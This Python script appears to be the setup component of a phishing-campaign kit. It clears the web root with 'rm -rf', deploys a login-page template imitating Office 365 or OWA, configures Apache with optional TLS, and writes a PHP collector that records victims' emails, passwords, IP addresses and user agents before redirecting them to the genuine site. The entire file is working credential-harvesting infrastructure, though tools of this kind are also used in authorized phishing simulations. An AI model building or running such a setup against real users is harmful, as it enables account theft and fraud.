#!/usr/bin/env python

import sys
import os
import subprocess
import shutil
import datetime
import argparse


def bait(titleArg, templateArg, domainArg, redirectArg, tlsArg):

    #Clean previous campaign:
    # user subprocess.call instead of subprocess.Popen as Popen is asyncronus and will cause problems in rest of code.
    if len(os.listdir('/var/www/html')) != 0:
        print(templateArg, domainArg, redirectArg, tlsArg)
        subprocess.call("rm -rf /var/www/html/*", shell=True)

    #TODO make relative path possible without hardcoded absolute.
    working_dir = "/opt/gwsProject/bait"

    # Copy bait to /var/www/html
    apache_dir = "/var/www/html/"
    bait_dir = os.path.join(f"{working_dir}/food", templateArg)
    bait_files = os.listdir(bait_dir)
    shutil.copytree(bait_dir, apache_dir, dirs_exist_ok = True)

    #Setup .conf for apache2
    sites_available_path = "/etc/apache2/sites-available/"
    ports_path = "/etc/apache2/"
    gwsTls_path = f"{working_dir}/configs/apachecfg/gwsTls.conf"
    gwsHttp_path = f"{working_dir}/configs/apachecfg/gwsHttp.conf"

    #Setup globals for .conf
    domain = domainArg
    redirect_to = redirectArg

    #Ask if you want TLS or not
    tls_req = tlsArg

    # Setup sites-available config #TLS
    # Do a upload form that will just upload those 3 files inside this ssl dir
    if tls_req == "y":
        TlsCrtPath = "/opt/gwsProject/bait/ssl/pub.pem"
        TlsKeyPath = "/opt/gwsProject/bait/ssl/priv.pem"
        TlsIntermediatePath = "/opt/gwsProject/bait/ssl/int.pem"

        shutil.copy(gwsTls_path, sites_available_path)
        with open(f"{sites_available_path}gwsTls.conf", 'r') as file:
            data = file.read()

            data = data.replace("{domain}", domain)
            data = data.replace("{TlsCrtPath}", TlsCrtPath)
            data = data.replace("{TlsKeyPath}", TlsKeyPath)
            data = data.replace("{TlsIntermediatePath}", TlsIntermediatePath)

        with open(f"{sites_available_path}gwsTls.conf", 'w') as file:
            file.write(data)
        if os.path.isfile("/etc/apache2/sites-enabled/gwsHttp.conf"):
            subprocess.Popen("a2dissite gwsHttp.conf > /dev/null 2>&1", shell=True)
        subprocess.Popen("a2ensite gwsTls.conf > /dev/null 2>&1", shell=True)
        ssl = 1

    #HTTP
    else:
        shutil.copy(gwsHttp_path, sites_available_path)
        with open(f"{sites_available_path}gwsHttp.conf", 'r') as file:
            data = file.read()

            data = data.replace("{domain}", domain)

        with open(f"{sites_available_path}gwsHttp.conf", 'w') as file:
            file.write(data)
        if os.path.isfile("/etc/apache2/sites-enabled/gwsTls.conf"):
            subprocess.Popen("a2dissite gwsTls.conf > /dev/null 2>&1", shell=True)
        subprocess.Popen("a2ensite gwsHttp.conf > /dev/null 2>&1", shell=True)
        ssl = 0

    # Bait is ready, we need to collect all that fish.

    filewrite = open("%s/post.php" % (apache_dir), "w")
    collector_file = ("collector_" + titleArg + ".txt")

    if ssl == 1:
        filewrite.write("""<?php include 'tracker.php';$file = '%s';file_put_contents($file, '{\n' . '"timestamp":"' . $date . '",' . '\n' . '"srcIp":"' . $ipaddress . '",' . '\n' . '"userAgent":"' . $browser . '",' . '\n' . '"username":"' . $email = $_POST['email'] . '",' . '\n' . '"password":"' . $shadowedPass . '"' . '\n' . '},\n', FILE_APPEND); /* If you are just seeing plain text you need to install php for apache apt-get install libapache2-mod-php */ header('Location: %s');?>""" % (collector_file, f"https://{redirect_to}"))
        filewrite.close()
        if os.path.isdir("/var/www/html"):
            logpath = ("/var/www/html")
            filewrite = open("%s/%s" % (logpath, collector_file), "w")
            filewrite.write("")
            filewrite.close()

    else:
        # [ ] needed to wrap JSON for JSON.parse, think of a way to do updateCampaign
        filewrite.write("""<?php include 'tracker.php';$file = '%s';file_put_contents($file, '{\n' . '"timestamp":"' . $date . '",' . '\n' . '"srcIp":"' . $ipaddress . '",' . '\n' . '"userAgent":"' . $browser . '",' . '\n' . '"username":"' . $email = $_POST['email'] . '",' . '\n' . '"password":"' . $shadowedPass . '"' . '\n' . '},\n', FILE_APPEND); /* If you are just seeing plain text you need to install php for apache apt-get install libapache2-mod-php */ header('Location: %s');?>""" % (collector_file, f"https://{redirect_to}"))
        filewrite.close()
        if os.path.isdir("/var/www/html"):
            logpath = ("/var/www/html")
            filewrite = open("%s/%s" % (logpath, collector_file), "w")
            filewrite.write("")
            filewrite.close()
        #Remove ssl from action so it posts to correct URL
        with open("/var/www/html/index.html", "r") as file:
            data = file.read()
            data = data.replace('action="https','action="http')
        with open("/var/www/html/index.html", "w") as file:
            file.write(data)

    # Check sys platform to perform chown
    if sys.platform == "darwin":
        subprocess.Popen("chown _www:_www '%s/%s'" % (logpath, collector_file), shell=True).wait()
    else:
        subprocess.Popen("chown www-data:www-data '%s/%s'" % (logpath, collector_file), shell=True).wait()

    # Start apache.
    stat = subprocess.call(["systemctl", "is-active", "--quiet", "apache2"])
    if(stat == 0):  # apache2 is active
        subprocess.Popen("sudo systemctl restart apache2 > /dev/null 2>&1", shell=True)
        print ("\nApache restarted, should be good to go")
    else:
        subprocess.Popen("sudo systemctl start apache2 > /dev/null 2>&1", shell=True)
        subprocess.Popen("sudo systemctl restart apache2 > /dev/null 2>&1", shell=True)
        print ("\nApache was stopped, starting/restarting it for applying configs...")

    if ssl == 1:
        print("Your campaing is live at: https://"+domain)
    else:
        print("Your campaing is live at: http://"+domain)


def main():
    parser = argparse.ArgumentParser(description="Bait Setup")

    # Define args
    parser.add_argument('--title', type=str, required=True, help="Your campaign needs a title")
    parser.add_argument('--template', type=str, required=True, help="Choose from current baits: o365, owa2019...  [ie. owa2019]: ")
    parser.add_argument('--domain', type=str, required=True, help="Give me domain for your campaign: [phish_domain.tld]: ")
    parser.add_argument('--redirect', type=str, required=True, help="Give me redirect domain [real_domain.tld]: ")
    parser.add_argument('--tls', type=str, required=True, help="y or n")

    # Parse the args

    args = parser.parse_args()

    #Call bait()
    bait(args.title, args.template, args.domain, args.redirect, args.tls)


if __name__ == "__main__":
    main()